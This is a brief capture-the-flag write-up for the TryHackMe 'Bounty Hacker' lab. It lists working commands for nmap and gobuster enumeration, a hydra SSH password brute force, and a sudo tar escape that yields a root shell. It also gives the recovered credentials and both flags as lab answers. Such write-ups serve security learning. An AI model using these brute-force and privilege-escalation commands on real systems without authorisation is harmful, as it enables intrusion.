# Bounty Hacker - THM Room
### Completed 1750 11 JAN 22
### d0nkeyk0ng787/gnome787

### Creds

SSH Login: lin:RedDr4gonSynd1cat3

### Enumeration

Run a basic nmap scan - nmap -sC -sV 10.10.193.77 -oN nmap/initial

Run a gobuster scan
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.193.77 -x php -o gobuster.out

The machine has ftp open with anonymous login enabled 

The ftp site has a couple files, one contains a name 'lin' and a list that looks interesting

We can use that list to try and bruteforce a password for ssh: hydra -l lin -P locks.txt 10.10.193.77 -t 4 ssh

This gives us a password 'RedDr4gonSynd1cat3'

### Priv Esc

We can use this account and gain access to the machine

User Flag: THM{CR1M3_SyNd1C4T3}

From here we can try and priv esc this box

Obviously start with the 'sudo -l' command which suggests we can run '/bin/tar' as sudo

We can head to GTFOBins and grab the payload for this exploit: sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

Now we are root

Root Flag: THM{80UN7Y_h4cK3r}



